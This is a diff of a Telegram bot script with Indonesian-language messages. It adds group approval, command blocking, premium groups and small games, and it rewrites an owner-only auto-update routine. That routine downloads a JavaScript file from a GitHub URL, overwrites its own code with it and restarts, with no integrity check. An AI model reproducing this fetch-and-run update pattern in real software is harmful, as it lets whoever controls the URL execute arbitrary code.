   try { await ctx.telegram.sendMessage(chatId, "✅ Grup ini sudah di-approve owner."); } catch {}
   ctx.reply(`✅ Grup ${chatId} di-approve.`);
@@ -626,8 +1146,7 @@ bot.command("unapproved", async (ctx) => {
   const chatId = ctx.message.text.split(" ").slice(1)[0];
   if (!chatId) return ctx.reply("🪧 Format: /unapproved -100xxxxxxxxxx");
   if (!isGroupApproved(chatId)) return ctx.reply("⚠️ Belum di-approve.");
-  approvedGroups = approvedGroups.filter((x) => x !== String(chatId));
-  saveApproved();
+  approvedGroups = approvedGroups.filter((x) => x !== String(chatId)); saveApproved();
   try { await ctx.telegram.sendMessage(chatId, "⚠️ Approval grup ini dicabut."); } catch {}
   ctx.reply(`✅ Approval grup ${chatId} dicabut.`);
 });
@@ -638,15 +1157,14 @@ bot.command("listapprovedgroup", async (ctx) => {
   ctx.reply(`📋 Grup approved:\n\n${approvedGroups.map((id, i) => `${i + 1}. ${id}`).join("\n")}`);
 });
 
-// =================== BLOCK CMD ===================
+// =================== BLOCK COMMAND ===================
 bot.command("blockcmd", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   const cmd = normCmd(ctx.message.text.split(" ").slice(1)[0]);
   if (!cmd) return ctx.reply("🪧 Format: /blockcmd namacommand");
   if (["blockcmd", "unblockcmd", "listblockcmd"].includes(cmd)) return ctx.reply("❌ Ini gak bisa diblokir.");
   if (blockedCommands.includes(cmd)) return ctx.reply(`⚠️ /${cmd} udah diblokir.`);
-  blockedCommands.push(cmd);
-  saveBlocked();
+  blockedCommands.push(cmd); saveBlocked();
   ctx.reply(`✅ /${cmd} diblokir.`);
 });
 
@@ -655,8 +1173,7 @@ bot.command("unblockcmd", async (ctx) => {
   const cmd = normCmd(ctx.message.text.split(" ").slice(1)[0]);
   if (!cmd) return ctx.reply("🪧 Format: /unblockcmd namacommand");
   if (!blockedCommands.includes(cmd)) return ctx.reply(`⚠️ /${cmd} gak diblokir.`);
-  blockedCommands = blockedCommands.filter((x) => x !== cmd);
-  saveBlocked();
+  blockedCommands = blockedCommands.filter((x) => x !== cmd); saveBlocked();
   ctx.reply(`✅ /${cmd} dibuka.`);
 });
 
@@ -666,19 +1183,21 @@ bot.command("listblockcmd", async (ctx) => {
   ctx.reply(`📋 Diblokir:\n\n${blockedCommands.map((c, i) => `${i + 1}. /${c}`).join("\n")}`);
 });
 
-// =================== PREMIUM GROUP ===================
+// =================== PREMIUM GROUP CMD ===================
 bot.command("addpremgrup", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   if (ctx.chat?.type === "private") return ctx.reply("❌ Pakai di grup.");
   addPremGroup(ctx.chat.id);
   ctx.reply(`✅ ☇ <b>${esc(ctx.chat?.title || "Grup")}</b> masuk daftar premium.`, { parse_mode: "HTML" });
 });
+
 bot.command("delpremgrup", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   if (ctx.chat?.type === "private") return ctx.reply("❌ Pakai di grup.");
   delPremGroup(ctx.chat.id);
   ctx.reply(`🗑 ☇ <b>${esc(ctx.chat?.title || "Grup")}</b> dihapus dari premium.`, { parse_mode: "HTML" });
 });
+
 bot.command("listpremgrup", async (ctx) => {
   if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner.");
   const d = loadPrem();
@@ -690,7 +1209,7 @@ bot.command("listpremgrup", async (ctx) => {
 const tttGames = new Map();
 function tttWinner(b) {
   const L = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
-  for (const [a,b1,c] of L) if (b[a] && b[a] === b[b1] && b[a] === b[c]) return b[a];
+  for (const [a, b1, c] of L) if (b[a] && b[a] === b[b1] && b[a] === b[c]) return b[a];
   return null;
 }
 const tttDraw = (b) => b.every((v) => v) && !tttWinner(b);
@@ -706,8 +1225,7 @@ bot.command("ttt", async (ctx) => {
   const chatId = ctx.chat.id;
   if (tttGames.has(chatId)) return ctx.reply("⚠️ Masih ada game jalan.");
   const gid = Date.now().toString().slice(-6);
-  const g = { id: gid, board: Array(9).fill(null), players: { X: ctx.from, O: null }, turn: "X", started: false };
-  tttGames.set(chatId, g);
+  tttGames.set(chatId, { id: gid, board: Array(9).fill(null), players: { X: ctx.from, O: null }, turn: "X", started: false });
   await ctx.reply(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(ctx.from)}</b>\n⭕ O : <b>Belum join</b>\n\n<i>Klik tombol buat join.</i>`, {
     parse_mode: "HTML",
     reply_markup: { inline_keyboard: [[{ text: "⭕ Join Game", callback_data: `tttjoin_${chatId}_${gid}` }]] },
@@ -734,27 +1252,20 @@ bot.command("leaderboard", async (ctx) => {
 
 bot.action(/^tttjoin_(.+)_(.+)$/, async (ctx) => {
   try {
-    const chatId = Number(ctx.match[1]);
-    const gid = String(ctx.match[2]);
+    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
     const g = tttGames.get(chatId);
     if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ditemukan", { show_alert: true });
     if (g.players.O) return ctx.answerCbQuery("⚠️ Slot O penuh", { show_alert: true });
     if (g.players.X.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah X", { show_alert: true });
-    g.players.O = ctx.from;
-    g.started = true;
-    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, {
-      parse_mode: "HTML",
-      reply_markup: tttKbd(chatId, gid, g.board),
-    });
+    g.players.O = ctx.from; g.started = true;
+    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
     return ctx.answerCbQuery("✅ Join sebagai O");
   } catch { return ctx.answerCbQuery("❌ Error"); }
 });
 
 bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
   try {
-    const chatId = Number(ctx.match[1]);
-    const gid = String(ctx.match[2]);
-    const idx = Number(ctx.match[3]);
+    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const idx = Number(ctx.match[3]);
     const g = tttGames.get(chatId);
     if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
     if (!g.started) return ctx.answerCbQuery("⚠️ Belum mulai", { show_alert: true });
@@ -767,27 +1278,18 @@ bot.action(/^tttmove_(.+)_(.+)_(\d+)$/, async (ctx) => {
       const wUser = w === "X" ? g.players.X : g.players.O;
       const lUser = w === "X" ? g.players.O : g.players.X;
       addWin(wUser); addLose(lUser);
-      await ctx.editMessageText(`🏆 <b>MENANG: ${tttName(wUser)}</b> (${w})\n\n⭐ +3 point`, {
-        parse_mode: "HTML",
-        reply_markup: tttKbd(chatId, gid, g.board, true),
-      });
+      await ctx.editMessageText(`🏆 <b>MENANG: ${tttName(wUser)}</b> (${w})\n\n⭐ +3 point`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
       tttGames.delete(chatId);
       return ctx.answerCbQuery("🏆 Selesai");
     }
     if (tttDraw(g.board)) {
       addDraw(g.players.X); addDraw(g.players.O);
-      await ctx.editMessageText(`🤝 <b>SERI</b>\n\n⭐ +1 point untuk berdua`, {
-        parse_mode: "HTML",
-        reply_markup: tttKbd(chatId, gid, g.board, true),
-      });
+      await ctx.editMessageText(`🤝 <b>SERI</b>\n\n⭐ +1 point untuk berdua`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board, true) });
       tttGames.delete(chatId);
       return ctx.answerCbQuery("🤝 Seri");
     }
     g.turn = g.turn === "X" ? "O" : "X";
-    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, {
-      parse_mode: "HTML",
-      reply_markup: tttKbd(chatId, gid, g.board),
-    });
+    await ctx.editMessageText(`🎮 <b>TIC TAC TOE</b>\n\n❌ X : <b>${tttName(g.players.X)}</b>\n⭕ O : <b>${tttName(g.players.O)}</b>\n\nGiliran: <b>${g.turn}</b>`, { parse_mode: "HTML", reply_markup: tttKbd(chatId, gid, g.board) });
     return ctx.answerCbQuery("✅ Ok");
   } catch { return ctx.answerCbQuery("❌ Error"); }
 });
@@ -816,8 +1318,7 @@ bot.command("suit", async (ctx) => {
   const chatId = ctx.chat.id;
   if (suitGames.has(chatId)) return ctx.reply("⚠️ Masih ada game suit.");
   const gid = Date.now().toString().slice(-6);
-  const g = { id: gid, p1: ctx.from, p2: null, p1Choice: null, p2Choice: null, started: false };
-  suitGames.set(chatId, g);
+  suitGames.set(chatId, { id: gid, p1: ctx.from, p2: null, p1Choice: null, p2Choice: null, started: false });
   await ctx.reply(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(ctx.from)}</b>\n👤 P2 : <b>Belum join</b>\n\n<i>Klik buat join.</i>`, {
     parse_mode: "HTML",
     reply_markup: { inline_keyboard: [[{ text: "⚔️ Join Suit", callback_data: `suitjoin_${chatId}_${gid}` }]] },
@@ -832,27 +1333,20 @@ bot.command("suitstop", async (ctx) => {
 
 bot.action(/^suitjoin_(.+)_(.+)$/, async (ctx) => {
   try {
-    const chatId = Number(ctx.match[1]);
-    const gid = String(ctx.match[2]);
+    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]);
     const g = suitGames.get(chatId);
     if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
     if (g.p2) return ctx.answerCbQuery("⚠️ P2 penuh", { show_alert: true });
     if (g.p1.id === ctx.from.id) return ctx.answerCbQuery("❌ Kamu udah P1", { show_alert: true });
-    g.p2 = ctx.from;
-    g.started = true;
-    await ctx.editMessageText(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(g.p1)}</b>\n👤 P2 : <b>${suitName(g.p2)}</b>\n\nPilih sekarang:`, {
-      parse_mode: "HTML",
-      reply_markup: suitKbd(chatId, gid),
-    });
+    g.p2 = ctx.from; g.started = true;
+    await ctx.editMessageText(`🎮 <b>SUIT PVP</b>\n\n👤 P1 : <b>${suitName(g.p1)}</b>\n👤 P2 : <b>${suitName(g.p2)}</b>\n\nPilih sekarang:`, { parse_mode: "HTML", reply_markup: suitKbd(chatId, gid) });
     return ctx.answerCbQuery("✅ Join sebagai P2");
   } catch { return ctx.answerCbQuery("❌ Error"); }
 });
 
 bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
   try {
-    const chatId = Number(ctx.match[1]);
-    const gid = String(ctx.match[2]);
-    const choice = String(ctx.match[3]);
+    const chatId = Number(ctx.match[1]); const gid = String(ctx.match[2]); const choice = String(ctx.match[3]);
     const g = suitGames.get(chatId);
     if (!g || g.id !== gid) return ctx.answerCbQuery("❌ Game gak ada", { show_alert: true });
     if (!g.started || !g.p2) return ctx.answerCbQuery("⚠️ Belum siap", { show_alert: true });
@@ -885,38 +1379,77 @@ bot.action(/^suitpick_(.+)_(.+)_(rock|paper|scissors)$/, async (ctx) => {
 });
 
 // =================== AUTO UPDATE ===================
-bot.command("update", async (ctx) => doUpdate(ctx));
-const UPDATE_URL = "https://raw.githubusercontent.com/sanz-max/seraphineupdate/main/Asmo.js";
-const UPDATE_FILE_PATH = "./Asmo.js";
+const UPDATE_URL       = "https://raw.githubusercontent.com/sanz-max/seraphineupdate/main/files.js";
+const UPDATE_FILE_PATH = "./files.js";
+const BACKUP_FILE_PATH = "./files.backup.js";
 
-function downloadToFile(url, fp) {
-  return new Promise((resolve, reject) => {
-    const file = fs.createWriteStream(fp);
-    https.get(url, (res) => {
-      if (res.statusCode !== 200) {
-        file.close(() => fs.unlink(fp, () => {}));
-        return reject(new Error(`HTTP_${res.statusCode}`));
-      }
-      res.pipe(file);
-      file.on("finish", () => file.close(resolve));
-    }).on("error", (err) => {
-      file.close(() => fs.unlink(fp, () => {}));
-      reject(err);
-    });
-  });
-}
-
-async function doUpdate(ctx) {
+bot.command("update", async (ctx) => {
   if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Khusus owner.");
-  await ctx.reply("⏳ <b>Auto Update Script...</b>", { parse_mode: "HTML" });
+
+  const chatId = ctx.chat.id;
+
+  const sent = await ctx.telegram.sendMessage(chatId, `\`\`\`
+⏳ Seraphine Update Script
+━━━━━━━━━━━━━━━━━
+[░░░░░░░░░░] 0%
+Status: Initializing...
+━━━━━━━━━━━━━━━━━
+\`\`\``, { parse_mode: "Markdown" });
+
+  const updateProgress = async (percent, status) => {
+    const filled = Math.floor(percent / 10);
+    const bar = "█".repeat(filled) + "░".repeat(10 - filled);
+    await ctx.telegram.editMessageText(chatId, sent.message_id, null, `\`\`\`
+⏳ Seraphine Update Script
+━━━━━━━━━━━━━━━━━
+[${bar}] ${percent}%
+Status: ${status}
+━━━━━━━━━━━━━━━━━
+\`\`\``, { parse_mode: "Markdown" }).catch(() => {});
+  };
+
   try {
-    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);
-    await ctx.reply("✅ <b>Update berhasil!</b> ♻ Restart...", { parse_mode: "HTML" });
-    setTimeout(() => process.exit(0), 1500);
+    await updateProgress(20, "Preparing...");
+    await sleep(500);
+
+    await updateProgress(40, "Downloading...");
+    const { data } = await axios.get(UPDATE_URL);
+    if (!data) { await updateProgress(40, "❌ File is empty!"); return ctx.reply("❌ Update failed: File is empty!"); }
+
+    await updateProgress(60, "Backing up...");
+    await sleep(500);
+    if (fs.existsSync(UPDATE_FILE_PATH)) fs.copyFileSync(UPDATE_FILE_PATH, BACKUP_FILE_PATH);
+
+    await updateProgress(80, "Installing...");
+    await sleep(500);
+    fs.writeFileSync(UPDATE_FILE_PATH, data);
+
+    await updateProgress(100, "Completed");
+    await sleep(800);
+
+    await ctx.reply(`✅ **Update Successful!**
+
+━━━━━━━━━━━━━━━━━
+📦 Backup    : files.backup.js
+🔄 Status    : Restarting bot...
+⏱ Time      : ${new Date().toLocaleString("en-US")}
+━━━━━━━━━━━━━━━━━
+
+_Bot will restart in 2 seconds..._`, { parse_mode: "Markdown" });
+
+    setTimeout(() => process.exit(), 2000);
   } catch (e) {
-    await ctx.reply(`❌ Gagal update: <code>${String(e.message || e)}</code>`, { parse_mode: "HTML" });
+    console.error("Update Error:", e);
+    await ctx.telegram.editMessageText(chatId, sent.message_id, null, `\`\`\`
+❌ UPDATE FAILED
+━━━━━━━━━━━━━━━━━
+[░░░░░░░░░░] ERROR
+Status: ${e.message}
+━━━━━━━━━━━━━━━━━
+\`\`\``, { parse_mode: "Markdown" }).catch(() => {});
+    await ctx.reply(`❌ **Update Failed!**\n\n**Error:** ${e.message}`, { parse_mode: "Markdown" });
   }
-}
+});
 
 // =================== DETEKSI BOT JOIN GRUP ===================
 bot.on("my_chat_member", async (ctx) => {
@@ -926,13 +1459,16 @@ bot.on("my_chat_member", async (ctx) => {
     const old = u.old_chat_member.status;
     const chat = u.chat;
     if (chat.type !== "group" && chat.type !== "supergroup") return;
+
     const chatId = String(chat.id);
     const title = chat.title || "Tanpa Nama";
 
     if (["member", "administrator"].includes(nw) && ["left", "kicked"].includes(old)) {
       if (isGroupApproved(chatId)) return;
+
       await ctx.telegram.sendMessage(chat.id, "⚠️ Bot belum di-approve owner.\nJika 10 menit gak di-approve, bot keluar otomatis.");
       await ctx.telegram.sendMessage(ownerID, `🚨 BOT DITAMBAHKAN KE GRUP BARU\n\nNama : ${title}\nID   : ${chatId}\n\nGunakan:\n/approved ${chatId}`);
+
       if (pendingGroups.has(chatId)) clearTimeout(pendingGroups.get(chatId).timeout);
       const t = setTimeout(async () => {
         try {
@@ -940,9 +1476,10 @@ bot.on("my_chat_member", async (ctx) => {
             await ctx.telegram.sendMessage(chat.id, "❌ Tidak di-approve 10 menit. Bot keluar.");
             await ctx.telegram.leaveChat(chat.id);
           }
-        } catch (e) {}
+        } catch {}
         finally { pendingGroups.delete(chatId); }
       }, 10 * 60 * 1000);
+
       pendingGroups.set(chatId, { title, timeout: t });
     }
   } catch (err) { console.error("my_chat_member err:", err.message); }
@@ -953,10 +1490,12 @@ bot.use(async (ctx, next) => {
   if (!ctx.chat) return next();
   const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
   if (!isGroup) return next();
+
   const chatId = String(ctx.chat.id);
   const text = ctx.message?.text || "";
   const cmd = text.startsWith("/") ? text.split(" ")[0].toLowerCase() : "";
   const bypass = ["/approved", "/unapproved", "/listapprovedgroup"];
+
   if (!isGroupApproved(chatId) && !bypass.includes(cmd)) {
     if (ctx.message?.text?.startsWith("/")) {
       await ctx.reply("❌ Grup ini belum di-approve owner.\n🪧 Format: /approved -100xxxxxxxxxx");
@@ -971,6 +1510,7 @@ bot.use(async (ctx, next) => {
   if (!ctx.message || !ctx.message.text) return next();
   const text = ctx.message.text.trim();
   if (!text.startsWith("/")) return next();
+
   const cmd = normCmd(text.split(" ")[0].split("@")[0]);
   const bypass = ["blockcmd", "unblockcmd", "listblockcmd"];
   if (!bypass.includes(cmd) && isBlocked(cmd)) {
